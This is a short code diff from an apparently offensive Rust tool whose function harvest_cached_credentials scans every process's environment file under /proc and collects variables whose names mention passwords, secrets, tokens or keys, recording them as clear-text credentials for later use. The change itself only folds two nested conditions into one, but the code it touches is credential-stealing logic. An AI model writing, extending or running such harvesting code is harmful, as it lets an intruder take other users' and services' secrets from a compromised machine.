@@ -109,10 +109,9 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
             if let Ok(env) = std::fs::read_to_string(pid_dir.join("environ")) {
                 for var in env.split('\0') {
                     let lower = var.to_lowercase();
-                    if lower.contains("password") || lower.contains("secret")
-                        || lower.contains("token") || lower.contains("key")
-                    {
-                        if var.len() < 500 {
+                    if (lower.contains("password") || lower.contains("secret")
+                        || lower.contains("token") || lower.contains("key"))
+                        && var.len() < 500 {
                             creds.push(LeechHarvest {
                                 credential_type: CredType::ClearTextPassword,
                                 username: "proc_env".into(),
@@ -122,7 +121,6 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
                                 priority: 10,
                             });
                         }
-                    }
                 }
             }
         }
